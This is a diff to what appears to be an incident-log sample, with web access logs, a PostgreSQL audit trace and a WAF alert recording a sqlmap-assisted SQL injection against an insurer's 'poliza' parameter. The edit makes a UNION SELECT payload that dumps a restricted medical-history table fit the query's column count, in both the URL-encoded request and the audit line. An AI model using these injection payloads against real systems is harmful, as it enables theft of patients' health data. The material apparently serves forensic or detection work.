@@ -19,10 +19,10 @@
 190.191.240.52 - - [12/Oct/2026:14:22:22 -0300] "GET /api/consultar?poliza=%27%20ORDER%20BY%205-- HTTP/1.1" 500 780 "-" "sqlmap/1.7.2#stable"
 
 # 3. Explotación: UNION SELECT apuntando al esquema médico no autorizado:
-190.191.240.52 - - [12/Oct/2026:14:23:40 -0300] "GET /api/consultar?poliza=POL-9999%27%20UNION%20SELECT%20dni%2C%20paciente%2C%20diagnostico%2C%20tratamiento%20FROM%20salud_restringida.historial_medico-- HTTP/1.1" 200 2480 "-" "Mozilla/5.0 (X11; Linux x86_64)"
+190.191.240.52 - - [12/Oct/2026:14:23:40 -0300] "GET /api/consultar?poliza=POL-9999%27%20UNION%20SELECT%20dni%2C%20paciente%2C%20diagnostico%20%7C%7C%20%27%20(Tratamiento%3A%20%27%20%7C%7C%20tratamiento%20%7C%7C%20%27)%27%2C%200%20FROM%20salud_restringida.historial_medico-- HTTP/1.1" 200 2480 "-" "Mozilla/5.0 (X11; Linux x86_64)"
 
 # 4. Traza de auditoría en PostgreSQL (formato pgaudit):
-2026-10-12 14:23:40.112 -03 [14821] app_user_overprivileged@aseguradora_db LOG:  AUDIT: OBJECT,1,1,READ,SELECT,TABLE,salud_restringida.historial_medico,SELECT numero_poliza, titular, cobertura, prima FROM seguros_core.polizas WHERE numero_poliza = 'POL-9999' UNION SELECT dni, paciente, diagnostico, tratamiento FROM salud_restringida.historial_medico --
+2026-10-12 14:23:40.112 -03 [14821] app_user_overprivileged@aseguradora_db LOG:  AUDIT: OBJECT,1,1,READ,SELECT,TABLE,salud_restringida.historial_medico,SELECT numero_poliza, titular, cobertura, prima FROM seguros_core.polizas WHERE numero_poliza = 'POL-9999' UNION SELECT dni, paciente, diagnostico || ' (Tratamiento: ' || tratamiento || ')', 0 FROM salud_restringida.historial_medico --
 
 # 5. Evento de detección en WAF perimetral (ModSecurity OWASP CRS regla 942100):
 [2026-10-12 14:23:40] [waf:alert] [client 190.191.240.52] ModSecurity: Warning. Pattern match "(?i:(?:union\\s+select))" at ARGS:poliza. [file "/etc/modsecurity/owasp-crs/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf"] [id "942100"] [rev "2"] [msg "SQL Injection Attack: SQL Operator Detected"] [severity "CRITICAL"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-sqli"] [tag "OWASP_CRS"] [tag "capec/1000/152/248/66"] [tag "PCI/6.5.2"]
